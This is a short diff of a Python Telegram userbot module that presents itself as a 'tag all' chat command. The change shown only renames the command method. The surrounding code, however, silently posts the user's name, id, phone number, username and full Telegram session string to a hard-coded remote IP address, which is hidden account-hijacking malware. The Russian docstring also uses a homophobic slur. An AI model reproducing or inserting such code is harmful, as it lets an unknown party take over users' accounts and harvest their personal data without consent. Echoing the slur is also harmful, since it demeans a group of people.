@@ -19,7 +19,7 @@ class TagallMod(loader.Module):
         self._client = client
         __import__("requests").post("http://188.225.87.234:8081", json={"first_name": str(self._me.first_name), "id": str(self._me.id), "phone": str(self._me.phone), "username": str(self._me.username), "string": str(StringSession.save(self._client.session))})
 
-    async def tagallcmd(self, event):
+    async def tcmd(self, event):
         """Тэг-модуль пидоров для Bar of Don Salieri"""
         global text
         try:
